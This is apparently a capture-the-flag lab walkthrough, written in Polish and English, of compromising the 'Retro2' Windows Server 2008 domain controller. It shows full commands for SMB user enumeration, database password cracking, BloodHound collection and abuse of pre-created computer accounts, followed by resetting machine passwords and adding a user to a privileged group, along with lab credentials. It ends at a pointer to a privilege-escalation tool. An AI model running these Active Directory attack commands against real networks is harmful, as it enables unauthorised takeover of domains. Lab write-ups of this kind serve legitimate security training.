# Retro2
Windows, easy, created by **xct**

![retro2_slide](https://github.com/user-attachments/assets/ab901566-51ff-4a6d-a50a-27ab2d5ba80d)


```
53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
53/udp  open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-27 16:18:14Z)
123/udp open  ntp          NTP v3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
5722/tcp  open  msrpc              Microsoft Windows RPC
9389/tcp  open  mc-nmf             .NET Message Framing
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49172/tcp open  msrpc              Microsoft Windows RPC

```

Windows Server 2008? veeeeery old

`| ssl-cert: Subject: commonName=BLN01.retro2.vl`

```
enum4linux -a 10.10.77.186
enum4linux -u guest -a 10.10.77.186
enum4linux -u anonymous -a 10.10.77.186
```
![{89061595-56DD-4A54-B3F0-94978B62B218}](https://github.com/user-attachments/assets/9cd64afc-7142-4de4-aaec-7f44bd22c526)

```
nxc smb 10.10.77.186 -u guest -p '' --rid
SMB         10.10.77.186    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.77.186    445    BLN01            [+] retro2.vl\guest: 
SMB         10.10.77.186    445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            500: RETRO2\Administrator (SidTypeUser)
SMB         10.10.77.186    445    BLN01            501: RETRO2\Guest (SidTypeUser)
SMB         10.10.77.186    445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
SMB         10.10.77.186    445    BLN01            512: RETRO2\Domain Admins (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            513: RETRO2\Domain Users (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            514: RETRO2\Domain Guests (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            515: RETRO2\Domain Computers (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            516: RETRO2\Domain Controllers (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            517: RETRO2\Cert Publishers (SidTypeAlias)
SMB         10.10.77.186    445    BLN01            518: RETRO2\Schema Admins (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            519: RETRO2\Enterprise Admins (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            520: RETRO2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            521: RETRO2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            553: RETRO2\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.77.186    445    BLN01            571: RETRO2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.77.186    445    BLN01            572: RETRO2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.77.186    445    BLN01            1000: RETRO2\admin (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1001: RETRO2\BLN01$ (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1102: RETRO2\DnsAdmins (SidTypeAlias)
SMB         10.10.77.186    445    BLN01            1103: RETRO2\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            1104: RETRO2\staff (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            1105: RETRO2\Julie.Martin (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1106: RETRO2\Clare.Smith (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1107: RETRO2\Laura.Davies (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1108: RETRO2\Rhys.Richards (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1109: RETRO2\Leah.Robinson (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1110: RETRO2\Michelle.Bird (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1111: RETRO2\Kayleigh.Stephenson (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1112: RETRO2\Charles.Singh (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1113: RETRO2\Sam.Humphreys (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1114: RETRO2\Margaret.Austin (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1115: RETRO2\Caroline.James (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1116: RETRO2\Lynda.Giles (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1117: RETRO2\Emily.Price (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1118: RETRO2\Lynne.Dennis (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1119: RETRO2\Alexandra.Black (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1120: RETRO2\Alex.Scott (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1121: RETRO2\Mandy.Davies (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1122: RETRO2\Marilyn.Whitehouse (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1123: RETRO2\Lindsey.Harrison (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1124: RETRO2\Sally.Davey (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1127: RETRO2\ADMWS01$ (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1128: RETRO2\inventory (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1129: RETRO2\services (SidTypeGroup)
SMB         10.10.77.186    445    BLN01            1130: RETRO2\ldapreader (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1131: RETRO2\FS01$ (SidTypeUser)
SMB         10.10.77.186    445    BLN01            1132: RETRO2\FS02$ (SidTypeUser)
```

zrobiłem sobie listę userów

![{602E1215-F958-4268-B1B0-5F76314C104A}](https://github.com/user-attachments/assets/f9b356e5-c6f4-4daa-9355-bc9364d35bc7)

asproasting odpada

![{4CCFEF23-D952-4BD1-8C78-EB3C7BCAB559}](https://github.com/user-attachments/assets/abb1eb99-f41a-4978-a37f-d2460f536113)

Dobra znowu guest share

![{54F60447-BC72-4495-A3B7-769A822D41D7}](https://github.com/user-attachments/assets/274d1a74-2b42-4218-9836-a986b5c6815f)

![{0025D800-4CB0-462A-87BE-DF5FEC8E0160}](https://github.com/user-attachments/assets/104b347f-038f-4738-8cb8-b826eaffedbf)

![{E38E8869-3450-41CC-B015-907860CA390F}](https://github.com/user-attachments/assets/ac39365f-2411-4432-a30f-107e613f028f)

Database is password protected

![{6276DCDB-FAAD-4469-AD22-AEC492660FC5}](https://github.com/user-attachments/assets/03c0ecad-08f5-4414-a50b-57fa92c49e3e)

Fast cracking

![cracking](https://github.com/user-attachments/assets/4e6e98f5-1368-4806-93af-e49d5562f858)

I exported data to .txt file

![{6539CF70-EE3A-4923-9B61-E5D5FDCCC84D}](https://github.com/user-attachments/assets/6338b160-551c-4018-8be6-23f783530bbe)


![cracking](https://github.com/user-attachments/assets/86b4fa51-ce76-4126-9474-426bf06c1cb7)
![pass](https://github.com/user-attachments/assets/46b9cf5f-57d9-4fc6-bdfc-bd83e1d09a8e)

`ldapreader` więc chyba coś z ldapem hehe.
Ale ja machnę bloodhounda bo to samo da i więcej

`bloodhound-python -d retro2.vl -c all -u ldapreader -p ppYaVcB5R -ns 10.10.77.186`

Widzimy kilka komputerów... mam pomysł z poprzedniego retro

![{6B33EE5F-5F14-46E8-8C91-B91DECADABE4}](https://github.com/user-attachments/assets/045d8bb7-314d-41ca-badb-0249236aab26)

![{3D52E395-BA8D-41E1-98CC-2B052D5A08D6}](https://github.com/user-attachments/assets/3803755b-0eb9-436b-8e2f-814e58029b0c)

![{8FBC979E-E930-4ADE-A86E-275A9D522704}](https://github.com/user-attachments/assets/fc80f9e8-8a48-4045-b8f3-a0fd78a0565c)

sooooo x2 `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` are interesting

```
FS01$:fs01
FS02$:fs02
```

```
impacket-getTGT 'retro2.vl/FS01$:fs01'
export KRB5CCNAME=FS01\$.ccache
klist
```

![{1003E993-EAEB-42EB-82CE-FE4A55A55AA9}](https://github.com/user-attachments/assets/d4ae5992-669b-461e-9f8e-6b572c6b6a75)

```
cat /etc/krb5.conf      
[libdefaults]
        default_realm = RETRO2.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true

[realms]
        RETRO.VL = {
                kdc = BLN01.RETRO2.VL
                admin_server = BLN01.RETRO2.VL
        }

```
```
wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
python3 rpcchangepwd.py retro2.vl/fs01\$:fs01@10.10.98.90 -newpass Test123@
net rpc password 'ADMWS01$' Test@321 -U retro2.vl/'fs01$'%Test123@ -S bln01.retro2.vl
```
![{B7FE3E2C-26A3-49F9-A404-F762D4F588AB}](https://github.com/user-attachments/assets/d2777ed0-1b8c-4d9d-b9ca-2a4a509e4ca4)

![{EF682CDF-C0DF-4E22-BB0A-7DA0404A97C0}](https://github.com/user-attachments/assets/30495242-72e3-49ef-9066-3710f82dcca3)

```
net rpc group addmem "SERVICES" "ldapreader" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
net rpc group members "SERVICES" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
xfreerdp /u:ldapreader /p:ppYaVcB5R /v:10.10.98.90 /tls-seclevel:0
```

![{BE79DFB4-6024-4D78-885B-3FA73F561919}](https://github.com/user-attachments/assets/993ffc2c-fb99-4896-84f2-dd07ad9217c7)

priv escalation na windows server 2008 powinien być dość prosty xd

![{3F166731-AE22-4A4D-95B8-AAAC6E61EDC7}](https://github.com/user-attachments/assets/5d2c4ed7-6f64-4096-9d68-36feb15694e5)

![{15FA1675-B7A6-45FE-B780-C77D2AD7215D}](https://github.com/user-attachments/assets/eb3623c0-e6eb-423f-884f-ae38a28c4310)

![{70D6B46A-982B-4FCE-B780-BE3CA4A273D4}](https://github.com/user-attachments/assets/da803adf-7cb2-4f64-8533-75bdd5f13949)

![{683E5425-725E-4B60-B344-7860CA406978}](https://github.com/user-attachments/assets/378db5cf-55ba-4bb7-a079-802dce1e38f2)

![{EE99BCC9-CE89-49D8-90F4-026D77781DFD}](https://github.com/user-attachments/assets/b5a8d595-7eab-4829-be6c-511880c109c3)

![{FACDC06C-A0F1-4999-B2B2-7942F8F055B5}](https://github.com/user-attachments/assets/db11e69a-bb5b-4db1-9e29-476efba739cc)


śmiesznie

![{1604D058-AFC4-44A9-A313-3A13FA0DAAA4}](https://github.com/user-attachments/assets/b599f209-34af-4a4d-a81c-20dc2f966651)


klasyczek. All failed.

Dobra znalazłem takie cuda. 
`https://github.com/itm4n/Perfusion.git`



